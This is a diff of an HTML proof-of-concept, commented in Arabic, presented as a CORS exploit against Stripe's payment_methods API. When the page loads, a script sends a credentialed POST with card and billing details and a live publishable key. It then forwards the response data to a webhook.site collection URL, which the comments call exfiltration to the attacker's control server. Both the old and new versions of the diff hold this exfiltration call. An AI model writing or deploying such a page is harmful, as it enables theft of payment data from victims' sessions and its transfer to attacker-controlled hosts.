@@ -2,35 +2,43 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CORS Exploit PoC - Stripe</title>
+    <title>Stripe PoC</title>
 </head>
 <body>
-    <h2>Exploit Running... Check Console or Exfiltration Server</h2>
     <script>
+        // الـ Endpoint المستهدف
         const targetUrl = "https://api.stripe.com/v1/payment_methods";
 
-        // الـ Body الكامل لنفس الـ Request
-        const postData = "type=card&card[number]=4539382852159718&card[cvc]=163&card[exp_month]=09&card[exp_year]=31&billing_details[name]=Sammie+Brakus&billing_details[email]=ruvhio%40zmail.edu.pl&billing_details[address][line1]=253+Mayer+Courts&billing_details[address][city]=hamed&billing_details[address][postal_code]=86252-6922";
+        // تجميع الـ Body بالكامل مع البارامترز المطلوبة
+        const postData = new URLSearchParams({
+            "type": "card",
+            "card[number]": "4539382852159718",
+            "card[cvc]": "163",
+            "card[exp_month]": "09",
+            "card[exp_year]": "31",
+            "billing_details[name]": "Sammie Brakus",
+            "billing_details[email]": "ruvhio@zmail.edu.pl",
+            "billing_details[address][line1]": "253 Mayer Courts",
+            "billing_details[address][city]": "hamed",
+            "billing_details[address][postal_code]": "86252-6922",
+            "key": "pk_live_51MPWO0AWilt2EAVVfWfPTQhgmLA0EeacLSzAs6e3vECCcMBvwcMse81XgX06klbdBHbPBdp0mrXE8P1gBrxE7yhH00RPHQ8SyG"
+            // وباقي الـ parameters لو حابب تضيفها هنا
+        });
 
         fetch(targetUrl, {
             method: "POST",
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
             },
-            credentials: "include", // أساسي عشان يبعت الـ Cookies/Session مع الطلب
+            credentials: "include",
             body: postData
         })
         .then(response => response.json())
         .then(data => {
-            // هيطبع الـ JSON الكامل اللي في الاستجابة قدامك في الكونسول
-            console.log("Stolen Payment Method Data:", data);
-
-            // خطوة إضافية لو عايز تسرق الداتا وتبعتها لسيرفر خارجي تملكه (Data Exfiltration):
-            fetch("https://webhook.site/d80e6a3b-5db7-401f-a4a9-04facede08b0/log?data=" + encodeURIComponent(JSON.stringify(data)));
+            // سحب الداتا وإرسالها لسيرفر التحكم الخاص بك (Exfiltration)
+            fetch("https://webhook.site/your-unique-id-here?data=" + encodeURIComponent(JSON.stringify(data)));
         })
-        .catch(error => {
-            console.error("Exploit Failed:", error);
-        });
+        .catch(error => console.error("Error:", error));
     </script>
 </body>
 </html>
